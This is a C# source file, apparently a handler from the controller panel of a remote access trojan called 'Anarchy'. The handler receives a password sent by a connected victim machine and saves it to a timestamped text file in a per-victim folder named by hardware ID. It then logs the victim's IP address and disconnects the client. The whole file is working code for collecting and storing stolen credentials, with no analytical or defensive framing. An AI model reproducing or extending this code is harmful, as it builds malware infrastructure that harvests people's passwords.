using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Anarchy.Helpers.MessagePack;
using Anarchy.Networking;

namespace Anarchy.Handlers
{
    internal class HandlePassword
    {
        public void SavePassword(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                string asString;
                asString = unpack_msgpack.ForcePathObject("Password").GetAsString();
                string text;
                text = Path.Combine(Application.StartupPath, "ClientsFolder\\" + unpack_msgpack.ForcePathObject("Hwid").AsString + "\\Password");
                if (!Directory.Exists(text))
                {
                    Directory.CreateDirectory(text);
                }
                File.WriteAllText(text + $"\\Password_{DateTime.Now:MM-dd-yyyy HH;mm;ss}.txt", asString);
                new HandleLogs().Addmsg("Client " + client.Ip + " password saved success，file located @ ClientsFolder/" + unpack_msgpack.ForcePathObject("Hwid").AsString + "/Password", Color.Purple);
                client.Disconnected();
            }
            catch (Exception ex)
            {
                new HandleLogs().Addmsg("Password saved error: " + ex.Message, Color.Red);
            }
        }
    }
}
